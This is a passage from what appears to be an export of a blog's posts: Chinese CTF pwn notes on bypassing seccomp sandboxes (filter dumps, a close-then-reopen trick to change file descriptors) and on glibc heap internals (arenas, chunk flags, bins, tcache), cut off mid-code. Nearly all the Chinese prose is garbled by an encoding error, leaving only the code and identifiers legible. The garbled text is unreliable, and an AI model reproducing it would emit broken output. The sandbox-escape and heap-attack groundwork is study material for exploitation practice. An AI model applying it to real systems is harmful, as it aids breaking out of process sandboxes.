ä¸ºå‰é¢ä¸‰ä¸ªå‡½æ•°å…¶å®éƒ½å¯¹åº”è°ƒç”¨åé¢çš„ä¸‰ä¸ªå‡½æ•°ã€‚å¦‚æœå®åœ¨æ²¡åŠæ³•æ‰“å°ï¼Œå¯ä»¥åˆ©ç”¨é¢˜ç›®ä¸­çš„é”™è¯¯ä¿¡æ¯è¾“å‡ºï¼Œä¿®æ”¹IO_FILEæ¥æ‰“å°ï¼Œè¯»å–ã€‚è¿˜æœ‰æ›´å¼ºçš„ç”¨ptraceä¿®æ”¹ç³»ç»Ÿè°ƒç”¨å·ï¼Œzer0pts CTF2020çš„sycall kitã€‚å®åœ¨æ‰¾ä¸åˆ°ï¼Œåé¢å†è¡¥å‘å§ã€‚\n\n(3)æ§åˆ¶äº†open,write,readçš„å‚æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x0b 0xc000003e if (A != ARCH_X86_64) goto 0013\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x08 0xffffffff if (A != 0xffffffff) goto 0013\n0005: 0x15 0x06 0x00 0x00000002 if (A == open) goto 0012\n0006: 0x15 0x00 0x06 0x00000000 if (A != read) goto 0013\n0007: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # read(fd, buf, count)\n0008: 0x25 0x03 0x00 0x00000000 if (A > 0x0) goto 0012\n0009: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0013\n0010: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)\n0011: 0x35 0x00 0x01 0x00000004 if (A < 0x4) goto 0013\n0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0013: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n \n\n```\n#æ³¨é‡Šå¤´\n\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x12 0xc000003e if (A != ARCH_X86_64) goto 0020\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x0f 0xffffffff if (A != 0xffffffff) goto 0020\n0005: 0x15 0x0d 0x00 0x00000002 if (A == open) goto 0019\n0006: 0x15 0x0c 0x00 0x00000003 if (A == close) goto 0019\n0007: 0x15 0x0b 0x00 0x0000000a if (A == mprotect) goto 0019\n0008: 0x15 0x0a 0x00 0x000000e7 if (A == exit_group) goto 0019\n0009: 0x15 0x00 0x04 0x00000000 if (A != read) goto 0014\n0010: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # read(fd, buf, count)\n0011: 0x15 0x00 0x08 0x00000000 if (A != 0x0) goto 0020\n0012: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)\n0013: 0x15 0x05 0x06 0x00000000 if (A == 0x0) goto 0019 else goto 0020\n0014: 0x15 0x00 0x05 0x00000001 if (A != write) goto 0020\n0015: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # write(fd, buf, count)\n0016: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0020\n0017: 0x20 0x00 0x00 0x00000010 A = fd # write(fd, buf, count)\n0018: 0x15 0x00 0x01 0x00000001 if (A != 0x1) goto 0020\n0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0020: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\nç±»ä¼¼è¿™ç§é™åˆ¶fdçš„ï¼Œå¯ä»¥å…ˆcloseå†openï¼Œæ”¹å˜fdï¼ŒåŒæ ·å¯¹åº”å‚æ•°ä¹Ÿå¯ä»¥é€‚å½“åšä¸€äº›ä¿®æ”¹æ¥ç»•è¿‡ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\n[seccompæ²™ç›’é€ƒé€¸åŸºç¡€â€”â€”æ²™ç›’çš„è§„åˆ™ç¼–å†™ - p0lar1s - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/p0lar1s/p/14697070.html#åŸºäºbpfä¼¯å…‹åˆ©åˆ†ç»„è¿‡æ»¤å™¨çš„seccompåº“å‡½æ•°)\n\n[(*Â´âˆ‡ï½€*) è¢«ä½ å‘ç°å•¦~ seccompå­¦ä¹ ç¬”è®° | A1ex's Blog](https://a1ex.online/2020/09/27/seccompå­¦ä¹ ç¬”è®°/)\n\n[PWNé¢˜ä¸­å¸¸è§çš„seccompç»•è¿‡æ–¹æ³• - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/219077#h2-0)\n\n[Seccompä»0åˆ°1 - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/208364#h2-10)\n\nç­‰ç­‰ï¼Œè´´ä¸è¿‡æ¥äº†ã€‚\n","tags":["ORW-Skill"],"categories":["ORW"]},{"title":"å †å‰ç½®çŸ¥è¯†æ€»ç»“","url":"/2021/08/19/å †å‰ç½®çŸ¥è¯†æ€»ç»“/","content":"\nä¸€ã€main_arenaæ€»æ¦‚\n\n1.arena:å †å†…å­˜æœ¬èº«\n\n(1)ä¸»çº¿ç¨‹çš„main_arena:ç”±sbrkå‡½æ•°åˆ›å»ºã€‚\n\nâ‘ æœ€å¼€å§‹è°ƒç”¨sbrkå‡½æ•°åˆ›å»ºå¤§å°ä¸º(128 KB + chunk_size) align 4KB çš„ç©ºé—´ä½œä¸º heap\n\nâ‘¡å½“ä¸å¤Ÿç”¨æ—¶ï¼Œç”¨sbrkæˆ–è€…mmapå¢åŠ heapå¤§å°ã€‚\n\n(2)å…¶å®ƒçº¿ç¨‹çš„per thread arena:ç”±mmapåˆ›å»ºã€‚\n\nâ‘ æœ€å¼€å§‹è°ƒç”¨ mmap æ˜ å°„ä¸€å—å¤§å°ä¸ºHEAP_MAX_SIZEï¼ˆ32 ä½ç³»ç»Ÿä¸Šé»˜è®¤ä¸º 1MBï¼Œ64 ä½ç³»ç»Ÿä¸Šé»˜è®¤ä¸º 64MBï¼‰çš„ç©ºé—´ä½œä¸º sub-heapã€‚\n\nâ‘¡å½“ä¸å¤Ÿç”¨æ—¶ï¼Œä¼šè°ƒç”¨ mmap æ˜ å°„ä¸€å—æ–°çš„ sub-heapï¼Œä¹Ÿå°±æ˜¯å¢åŠ  top chunk çš„å¤§å°ï¼Œæ¯æ¬¡ heap å¢åŠ çš„å€¼éƒ½ä¼šå¯¹é½åˆ°4KBã€‚\n\n2.malloc_state:ç®¡ç†arenaçš„ä¸€ä¸ªç»“æ„ï¼ŒåŒ…æ‹¬å †çŠ¶æ€ä¿¡æ¯ï¼Œbinsé“¾è¡¨ç­‰ç­‰\n\n(1)main_arenaå¯¹åº”çš„malloc_stateå­˜å‚¨åœ¨glibcçš„å…¨å±€å˜é‡ä¸­\n\n(å¦‚æœå¯ä»¥æ³„éœ²malloc_stateç»“æ„ä½“çš„åœ°å€ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ³„éœ²glibcçš„åœ°å€)\n\n(2)per thread arenaå¯¹åº”çš„malloc_stateå­˜å‚¨åœ¨å„è‡ªæœ¬èº«çš„arena\n\n3.bins:ç”¨é“¾è¡¨ç»“æ„ç®¡ç†ç©ºé—²çš„chunkå—ï¼Œé€šè¿‡freeé‡Šæ”¾è¿›å…¥çš„chunkå—(åƒåœ¾æ¡¶)\n\n4.chunks:ä¸€èˆ¬æ„ä¹‰ä¸Šçš„å †å†…å­˜å—\n\n```c\n#æ³¨é‡Šå¤´\n\nstruct malloc_state{\nmutex_t mutex;//(ç›¸å½“äºå¤šçº¿ç¨‹çš„äº’æ–¥é”)\nint flags;//(è®°å½•åˆ†é…å™¨çš„ä¸€äº›æ ‡å¿—ï¼Œbit0 ç”¨äºæ ‡è¯†åˆ†é…åŒºæ˜¯å¦åŒ…å«è‡³å°‘ä¸€ä¸ª fast bin chunkï¼Œbit1 ç”¨äºæ ‡è¯†åˆ†é…åŒºæ˜¯å¦èƒ½è¿”å›è¿ç»­çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚)\nmfastbinptr fastbinsY[NFASTBINS];//(ä¸€ä¸ªæ•°ç»„ï¼Œé‡Œé¢çš„å…ƒç´ æ˜¯å„ä¸ªä¸åŒå¤§å°çš„fastbinsçš„é¦–åœ°å€)\nmchunkptr top;//(top chunkçš„é¦–åœ°å€)\nmchunkptr last_remainder;//(æŸäº›æƒ…å†µä¸‹åˆ‡å‰²å‰©ä¸‹æ¥çš„å †å—)\nmchunkptr bins[NBINS*2-2];\n.......................................................\nunsigned int binmap[BINMAPSIZE];//(ä»¥bitä¸ºå•ä½çš„æ•°ç»„ï¼Œå…±128bitï¼Œ16ä¸ªå­—èŠ‚ï¼Œ4ä¸ªintï¼Œç”±äºbinçš„æ•°é‡ä¸º128ï¼Œå¯¹äºè¿™é‡Œé¢çš„128bitï¼Œä¸º0è¡¨è¯¥binæ²¡ç”¨æœ‰ç©ºé—²å—ï¼Œä¸º1è¡¨æœ‰ç©ºé—²å—ã€‚é€šè¿‡å››ä¸ªintçš„å¤§å°å¯ä»¥æ‰¾å‡ºä¸åŒindexçš„binä¸­æ˜¯å¦æœ‰ç©ºé—²å—ã€‚è¿™ä¸ªåœ¨æŸäº›æ—¶å€™ä¼šç”¨åˆ°ã€‚)\n......//åé¢è¿˜æœ‰ï¼Œä¸å¤ªé‡è¦\n}\n```\n\nâ–²å†…å­˜ä¸­çš„å †æƒ…å†µï¼š\n\nå…¨å±€å˜é‡glibc:main_arena = struct malloc_state:\n\n| mutes | bin  | ..... | top  | lastremainder |\n| ----- | ---- | ----- | ---- | ------------- |\n|       |      |       |      |               |\n\n \n\n| Allocated chunk | Allocated chunk | Freechunk1 | Allocated chunk | Freechunk2 | Allocated chunk | Topchunk |\n| --------------- | --------------- | ---------- | --------------- | ---------- | --------------- | -------- |\n|                 |                 |            |                 |            |                 |          |\n\nä½åœ°å€------------------------------------------------------------- ------------------>é«˜åœ°å€\n\nç”±sbrkåˆ›å»ºçš„main_arena\n\n(1)å¯ä»¥æŠŠbinä¹Ÿå½“ä½œä¸€ä¸ªchunkï¼Œä¸åŒBinsç®¡ç†ç»“æ„ä¸åŒï¼Œæœ‰å•å‘é“¾è¡¨ç®¡ç†å’ŒåŒå‘é“¾è¡¨ç®¡ç†ã€‚\n\n(2)topé‡Œçš„bkä¿å­˜Topchunkçš„é¦–åœ°å€ã€‚\n\n(bkå’Œfdåªç”¨äºBinsé“¾è¡¨ä¸­ï¼Œallocated_chunkä¸­æ˜¯å±äºç”¨æˆ·å¯ä»¥ä½¿ç”¨çš„å†…å®¹)\n\n \n\n \n\n \n\näºŒã€chunkç»“æ„ï¼š\n\n1.åœ¨ä½¿ç”¨ä¸­çš„allocated_chunkå’Œæœªè¢«ä½¿ç”¨çš„free_chunkï¼š\n\n(1)allocated_chunkï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png)\n\n(2)free_chunk:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png)\n\n2.prev_sizeï¼š8å­—èŠ‚ï¼Œä¿å­˜å‰ä¸€ä¸ªchunkçš„å¤§å°ï¼Œåœ¨allocatedchunkä¸­å±äºç”¨æˆ·æ•°æ®ï¼Œå‚è€ƒä¸Šè¿°çš„å›¾ç‰‡ï¼Œfree_chunkçš„ä¸‹ä¸€ä¸ªchunkçš„pre_sizeä½ä¸ºè¯¥free_chunkçš„sizeã€‚\n\n3.size:8å­—èŠ‚ï¼Œä¿å­˜å½“å‰chunkå¤§å°ã€‚(freeå’Œallocatedéƒ½æœ‰ç”¨)ä¸€ä¸ªchunkçš„sizeä»¥0x10é€’å¢ï¼Œä»¥0x20ä¸ºæœ€å°chunkã€‚\n\n(1)malloc(0x01)ï¼šä¼šæœ‰0x20è¿™ä¹ˆå¤§ï¼Œå®é™…ç”¨æˆ·å¯ç”¨æ•°æ®å°±æ˜¯0x18ã€‚size=0x21\n\n(2)malloc(0x01-0x18)ï¼šä»ç„¶0x20è¿™ä¹ˆå¤§ï¼Œå®é™…ç”¨æˆ·å¯ç”¨æ•°æ®å°±æ˜¯0x18ã€‚size=0x21\n\n(3)malloc(0x18)ï¼šä¼šæœ‰0x30è¿™ä¹ˆå¤§ï¼Œå®é™…ç”¨æˆ·å¯ç”¨æ•°æ®æ˜¯0x28ã€‚size=0x31\n\næ‰€ä»¥sizeè¿™ä¸ª8å­—èŠ‚å†…å­˜çš„æœ€ä½4ä½éƒ½ä¸ä¼šè¢«ç”¨åˆ°ï¼Œæ‰€ä»¥mallocç®¡ç†æœºåˆ¶ç»™æœ€ä½çš„3ä½æäº†ä¸ªç‰¹æ®Šå½¢å¼æ ‡å¿—ä½ï¼ŒA,M,Pï¼Œåˆ†åˆ«ä»£è¡¨ä¸åŒå†…å®¹ã€‚\n\nâ‘ A:NON_MAIN_ARENAï¼Œä»£è¡¨æ˜¯å¦å±äºémain_arenaï¼Œ1è¡¨æ˜¯ï¼Œ0è¡¨å¦ã€‚å°±æ˜¯çº¿ç¨‹çš„ä¸åŒã€‚\n\n```c\n#æ³¨é‡Šå¤´\n\n#define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)\n```\n\nâ‘¡M:IS_MMAPPEDï¼Œä»£è¡¨å½“å‰chunkæ˜¯å¦æ˜¯mmapå‡ºæ¥çš„ã€‚\n\n```c\n#æ³¨é‡Šå¤´\n\n#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)\n```\n\nâ‘¢P:PREV_INUSEï¼Œä»£è¡¨å‰ä¸€ä¸ªchunkæ˜¯å¦æ­£åœ¨è¢«ä½¿ç”¨ï¼Œå¤„äºallocatedè¿˜æ˜¯freeã€‚\n\n```c\n#æ³¨é‡Šå¤´\n\n#define prev_inuse(p) ((p)->size & PREV_INUSE)\n```\n\n(æ ‡å¿—ä½ä¸º1éƒ½ä»£è¡¨æ˜¯ï¼Œ0éƒ½ä»£è¡¨å¦)\n\n \n\nä¸‰ã€binsç»“æ„ï¼š\n\n1.fastbins:æ”¾åœ¨struct malloc_stateä¸­çš„mfastbinptr fastbinsY[NFASTBINS]æ•°ç»„ä¸­ã€‚\n\n(1)å½’ç±»æ–¹å¼ï¼šåªä½¿ç”¨fdä½\n\nâ‘ binçš„indexä¸º1ï¼Œbins[0],bins[1]ç»„æˆä¸€ä¸ªbinã€‚\n\nâ‘¡è§„å®šå¤§å°çš„chunkå½’åˆ°ä¸€ç±»ï¼Œä½†ä¸ªæ•°æœ‰é™ï¼Œä¸åŒç‰ˆæœ¬ä¸åŒï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥è®¾ç½®å…¶èŒƒå›´ï¼š\n\nM_MXFASTå³ä¸ºå…¶æœ€å¤§çš„å‚æ•°ï¼Œå¯ä»¥é€šè¿‡ mallopt()è¿›è¡Œè®¾ç½®ï¼Œä½†æœ€å¤§åªèƒ½æ˜¯80Bã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.jpg)\n\n(2)å•å‘é“¾è¡¨ï¼š\n\nâ–²ä¾‹å­ï¼ša=malloc(0x10); b=malloc(0x10); c=malloc(0x10); d=malloc(0x10)\n\nFastbinY,d,c,b,a\n\nâ‘ free(a)ä¹‹åï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nfastbinY[0x20]->a;       a.fd=0\n```\n\nâ‘¡free(b)ä¹‹åï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nfastbinY[0x20]->b;       b.fd=a       a.fd=0\n```\n\nâ‘¢free(c)ä¹‹åï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nfastbinY[0x20]->c;        c.fd=b       b.fd->a;    a.fd=0\n```\n\nâ‘£free(d)ä¹‹åï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nfastbinY[0x20]->d;       d.fd=c       c.fd->b;     b.fd->a;    a.fd=0\n```\n\n(3)åè¿›å…ˆå‡ºï¼š\n\nâ‘ m=malloc(0x10):      m->d\n\nâ‘¡n=malloc(0x10):      n->c\n\n(4)ä¸æ”¹å˜IN_USEä½(pä½):\n\nå¦‚æœæŸä¸ªchunkè¿›å…¥åˆ°fastbinä¸­ï¼Œé‚£ä¹ˆè¯¥chunkçš„ä¸‹ä¸€ä¸ªchunkçš„IN_USEä½è¿˜æ˜¯ä¸º1ï¼Œä¸ä¼šæ”¹å˜æˆ0ã€‚\n\nä¾‹å­ï¼ša=malloc(0x10); b=malloc(0x10); c=malloc(0x10);\n\nâ‘ free(a)ä¹‹å:     b.p=1\n\nâ‘¡free(b)ä¹‹åï¼š   c.p=1;   b.p=1\n\npä½ä¸ä¼šå˜æˆ0ï¼Œå¦‚æœè¯¥chunkè¿›å…¥åˆ°fastbinsä¸­ã€‚\n\nå¯ä»¥è¿›è¡Œfree(0),free(1),free(0)ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥free(0)ä¸¤æ¬¡ã€‚\n\n(5)é™¤äº†malloc_consolidateå‡½æ•°ä¼šæ¸…ç©ºfastbinsï¼Œå…¶å®ƒçš„æ“ä½œéƒ½ä¸ä¼šå‡å°‘fastbinsä¸­chunkçš„æ•°é‡ã€‚\n\n \n\n \n\n2.smallbins:æ”¾åœ¨bins[2]-bins[125]ä¸­ï¼Œå…±è®¡62ç»„ï¼Œæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ã€‚æœ€å¤§chunkçš„å¤§å°ä¸è¶…è¿‡1024å­—èŠ‚\n\n(1)å½’ç±»æ–¹å¼ï¼š\n\nâ‘ ç›¸åŒå¤§å°çš„chunkå½’åˆ°ä¸€ç±»ï¼šå¤§å°èŒƒå›´[0x20,0x3f0]ï¼Œ0x20ã€0x30ã€....0x3f0ã€‚æ¯ç»„binsä¸­çš„chunkå¤§å°ä¸€å®šã€‚\n\nâ‘¡æ¯ç»„binä¸­çš„chunkå¤§å°æœ‰å¦‚ä¸‹å…³ç³»ï¼šChunk_size=2 * SIZE_SZ * indexï¼Œindexå³ä¸º2-63ï¼Œä¸‹å›¾ä¸­64å³ä¸ºlargebinsçš„èŒƒå›´äº†ã€‚(SIZE_SZåœ¨32ï¼Œ64ä½ä¸‹åˆ†åˆ«ä½4ï¼Œ8ã€‚)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.jpg)\n\n(2)åŒå‘é“¾è¡¨ï¼š\n\nâ–²ä¾‹å­ï¼ša=malloc(0x100); b=malloc(0x100); c=malloc(0x100)\n\nâ‘ free(a)ä¹‹å:      smallbin,a\n\n```c\n#æ³¨é‡Šå¤´\n\nsmallbin.bk->a;         a.bk->smallbin;      \nsamllbin.fd->a          a.fd->smallbin;\n```\n\nâ‘¡free(b)ä¹‹å:    smallbin,b,a\n\n```c\n#æ³¨é‡Šå¤´\n\nsmallbin.bk->a;       a.bk->b    b.bk->smallbin\nsmallbin.fd->b;       b.fd->a    a.fd->smallbin\n```\n\nâ‘¢free(c)ä¹‹åï¼š   smallbin,c,b,a\n\n```c\n#æ³¨é‡Šå¤´\n\nsmallbin.bk->a;       a.bk->b    b.bk->c    c.bk->smallbin\nsmallbin.fd->c;       c.fd->b    b.fd->a    a.fd->smallbin\n```\n\nï¼ˆfd,bkä¸ºbins[n]ï¼Œbins[n+1]ã€‚fdå’Œbkå…±åŒæ„æˆä¸€ä¸ªBinatã€‚ï¼‰\n\n(3)å…ˆè¿›å…ˆå‡ºï¼š\n\nâ‘ m=malloc(0x100):         m->a\n\nâ‘¡n=malloc(0x100):         n->b\n\n(4)å½“æœ‰ç©ºé—²chunkç›¸é‚»æ—¶ï¼ŒChunkä¼šè¢«åˆå¹¶æˆä¸€ä¸ªå¤§chunkï¼Œè¿™é‡ŒæŒ‡çš„æ˜¯ç‰©ç†ä¸Šçš„åœ°å€ç›¸é‚»ï¼Œä¸æ˜¯é“¾è¡¨ä¸­ç›¸é‚»ã€‚é€šè¿‡åˆ¤æ–­å½“å‰chunkçš„in_useä½çš„å€¼æ¥åˆ¤æ–­å‰ä¸€ä¸ªchunkæ˜¯å¦å¤„äºFreeï¼Œå¦‚æœæ˜¯ï¼Œé‚£ä¹ˆåˆå¹¶ã€‚å†é€šè¿‡å½“å‰chunké¦–åœ°å€åŠ ä¸Šsizeå–å¾—ä¸‹ä¸€ä¸ªchunké¦–åœ°å€ï¼Œå†å°†ä¸‹ä¸€ä¸ªchunké¦–åœ°å€åŠ ä¸Šå®ƒè‡ªå·±çš„sizeï¼Œå–å¾—ä¸‹ä¸‹ä¸ªchunkçš„é¦–åœ°å€ï¼Œç„¶ååˆ¤æ–­ä¸‹ä¸‹ä¸ªchunkçš„in_useä½çš„å€¼çœ‹æ˜¯å¦ä¸‹ä¸ªchunkå¤„äºFreeï¼Œå¦‚æœå¤„äºFreeï¼Œåˆ™åˆå¹¶ã€‚\n\n \n\n \n\n3.largebins:æ”¾åœ¨bins[126]-bins[251]ï¼Œå…±è®¡63ç»„ï¼Œbinçš„indexä¸º64-126ï¼Œæœ€å°chunkçš„å¤§å°ä¸å°äº1024ä¸ªå­—èŠ‚ã€‚\n\n(1)å½’ç±»æ–¹å¼ï¼šèŒƒå›´å½’ç±»ï¼Œä¾‹å¦‚bins[126]-bins[127]ä¸­ä¿å­˜chunkèŒƒå›´åœ¨[0x400,0x440]ã€‚ä¸”chunkåœ¨ä¸€ä¸ªbinä¸­æŒ‰ç…§ä»å¤§åˆ°å°æ’åºï¼Œä¾¿äºæ£€ç´¢ã€‚å…¶å®ƒä¸smallbinsåŸºæœ¬ä¸€è‡´ã€‚\n\nâ‘ èŒƒå›´æ¨¡å¼ï¼šç”±ä»¥ä¸‹ä»£ç å®šä¹‰èŒƒå›´ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\n#define largebin_index_64(sz)                                               \n  (((((unsigned long) (sz)) >> 6) <= 48) ?  48 + (((unsigned long) (sz)) >> 6) :\n   ((((unsigned long) (sz)) >> 9) <= 20) ?  91 + (((unsigned long) (sz)) >> 9) :\n   ((((unsigned long) (sz)) >> 12) <= 10) ? 110 + (((unsigned long) (sz)) >> 12) :\n   ((((unsigned long) (sz)) >> 15) <= 4) ? 119 + (((unsigned long) (sz)) >> 15) :\n   ((((unsigned long) (sz)) >> 18) <= 2) ? 124 + (((unsigned long) (sz)) >> 18) :\n   126)\n```\n\nâ‘¡èŒƒå›´å…·ä½“å®ä¾‹ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nsize                           index\n[0x400 , 0x440)                64\n[0x440 , 0x480)                65\n[0x480 , 0x4C0)                66\n[0x4C0 , 0x500)                67\n[0x500 , 0x540)                68\nç­‰å·® 0x40      â€¦\n[0xC00 , 0xC40)                96\n[0xC40 , 0xE00)                97\n[0xE00 , 0x1000)               98\n[0x1000 , 0x1200)              99\n[0x1200 , 0x1400)              100\n[0x1400 , 0x1600)              101\nç­‰å·® 0x200    â€¦\n[0x2800 , 0x2A00)              111\n[0x2A00 , 0x3000)              112\n[0x3000 , 0x4000)              113\n[0x4000 , 0x5000)              114\nç­‰å·® 0x1000 â€¦\n[0x9000 , 0xA000)              119\n[0xA000 , 0x10000)             120\n[0x10000 , 0x18000)            121\n[0x18000 , 0x20000)            122\n[0x20000 , 0x28000)            123\n[0x28000 , 0x40000)            124\n[0x40000 , 0x80000)            125\n[0x80000 , â€¦. )                126\n```\n\n(2)åŒå‘é“¾è¡¨ï¼Œä½†æ˜¯æœ‰ä¸¤ç§æ’åˆ—æ–¹å¼ï¼š\n\nâ‘ å–ç”¨æ’åˆ—ï¼š\n\né¦–å…ˆä¾æ®fd_nextsizeï¼Œbk_nextsizeä¸¤ä¸ªæŒ‡é’ˆå¤§å°æ‰¾åˆ°é€‚åˆçš„ï¼Œç„¶åæŒ‰ç…§æ­£å¸¸çš„FIFOå…ˆè¿›å…ˆå‡ºåŸåˆ™ï¼Œé€šè¿‡fd,bkæ¥æ’åˆ—ã€‚\n\nâ‘¡å¤§å°æ’åˆ—ï¼š\n\næ¯ä¸ªè¿›å…¥largebinçš„chunk\n\nå…¶chunk_addr+0x20å¤„å³ä¸ºå…¶fd_nextsizeæŒ‡é’ˆï¼Œchunk_addr+0x28å¤„ä¸ºå…¶bk_nextsizeæŒ‡é’ˆã€‚\n\nç„¶åé€šè¿‡fd_nextsizeï¼Œbk_nextsizeä¸¤ä¸ªæŒ‡é’ˆä¾æ®ä»å¤§è‡³å°çš„é¡ºåºæ’åˆ—ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png)\n\n(è¿™å¼ å›¾ç‰‡æˆ‘ä¹Ÿå¿˜è®°ä»å“ªé‡Œæ•´çš„äº†...ä¾µåˆ )\n\nå…¶ä¸­sizeé¡ºåºä¸ºï¼šD>C>B>Aï¼Œä½†æ˜¯é‡Šæ”¾é¡ºåºå´ä¸ä¸€å®šæ˜¯è¿™æ ·çš„ã€‚è®¾ç½®è¿™ä¸ªçš„åŸå› æ˜¯å½“ç”³è¯·ç‰¹å®šå¤§å°çš„å †å—æ—¶ï¼Œå¯ä»¥æ®æ­¤æ¥å¿«é€ŸæŸ¥æ‰¾ï¼Œæå‡æ€§èƒ½ã€‚\n\n(3)ç‰¹æ®Šè§£é“¾ï¼š\n\nç”±äºlargebinä¸­ä¼šå­˜åœ¨fd_nextsizeæŒ‡é’ˆå’Œbk_nextsizeæŒ‡é’ˆï¼Œæ‰€ä»¥é€šå¸¸çš„largebin_attackå°±æ˜¯é’ˆå¯¹è¿™ä¸ªè¿›è¡Œåˆ©ç”¨çš„ã€‚\n\nå€Ÿç”¨æ˜Ÿé˜‘ç§‘æŠ€çš„ä¸€å¼ å›¾è¯´æ˜ä¸€åˆ‡ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.jpg)\n\n \n\n \n\n4.unsortedbins:bins[0]å’Œbins[1]ä¸­ï¼Œbins[0]ä¸ºfdï¼Œbins[1]ä¸ºbkï¼Œbinçš„indexä¸º1ï¼ŒåŒé“¾è¡¨ç»“æ„ã€‚\n\n(1)å½’ç±»æ–¹å¼ï¼šåªæœ‰ä¸€ä¸ªbinï¼Œå­˜æ”¾æ‰€æœ‰ä¸æ»¡è¶³fastbinï¼Œæœªè¢«æ•´ç†çš„chunkã€‚\n\n(2)åŒå‘é“¾è¡¨ï¼š\n\na=malloc(0x100); b=malloc(0x100); c=malloc(0x100)\n\nâ‘ free(a)ä¹‹å:      unsortedbin,a\n\n```c\n#æ³¨é‡Šå¤´\n\nunsortedbin.bk->a;  a.bk->unsortedbin;\nunsortedbin.fd->a;  a.fd->unsortedbin;\n```\n\nâ‘¡free(b)ä¹‹å:    unsortedbin,b,a\n\n```c\n#æ³¨é‡Šå¤´\n\nunsortedbin.bk->a;  a.bk->b     b.bk->unsortedbin\nunsortedbin.fd->b;  b.fd->a     a.fd->unsortedbin\n```\n\nâ‘¢free(c)ä¹‹åï¼š   unsortedbin,c,b,a\n\n```c\n#æ³¨é‡Šå¤´\n\nunsortedbin.bk->a;  a.bk->b     b.bk->c     c.bk->unsortedbin\nunsortedbin.fd->c;  c.fd->b     b.fd->a     a.fd->unsortedbin\n```\n\n(3)å…ˆè¿›å…ˆå‡ºï¼š\n\nâ‘ m=malloc(0x100):         m->a\n\nâ‘¡n=malloc(0x100):         n->b\n\nâ–²ä¾æ®fdæ¥éå†ï¼š\n\nå¦‚æœfdé“¾é¡ºåºä¸ºA->B->C\n\né‚£ä¹ˆè§£é“¾é¡ºåºä¸€å®šæ˜¯å…ˆè§£Cï¼Œå†è§£Bï¼Œå†è§£Aã€‚\n\n \n\n \n\n \n\n5ã€Tcacheæœºåˆ¶ï¼šä»libc-2.26åŠä»¥åéƒ½æœ‰:å…ˆè¿›åå‡ºï¼Œæœ€å¤§ä¸º0x410\n\n(1)ç»“æ„ï¼š\n\nâ‘ 2.29ä»¥ä¸‹ï¼Œæ— keyå­—æ®µçš„tcacheï¼Œç»“æ„å¤§å°ä¸º0x240ï¼ŒåŒ…æ‹¬chunkå¤´åˆ™å æ®0x250:\n\n```c\n#æ³¨é‡Šå¤´\n\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];//0x40\n  tcache_entry *entries[TCACHE_MAX_BINS];//0x40\n} tcache_perthread_struct;\n```\n\nA.counts:æ˜¯ä¸ªæ•°ç»„ï¼Œæ€»å…±64ä¸ªå­—èŠ‚ï¼Œå¯¹åº”tcacheçš„64ä¸ªbinï¼Œæ¯ä¸ªå­—èŠ‚ä»£è¡¨å¯¹åº”binä¸­å­˜åœ¨chunkçš„ä¸ªæ•°ï¼Œæ‰€ä»¥æ¯ä¸ªå­—èŠ‚éƒ½ä¼šå°äº8ï¼Œä¸€èˆ¬ä½¿ç”¨\n\n```c\n#æ³¨é‡Šå¤´\n\ntc_idx = csize2tidx 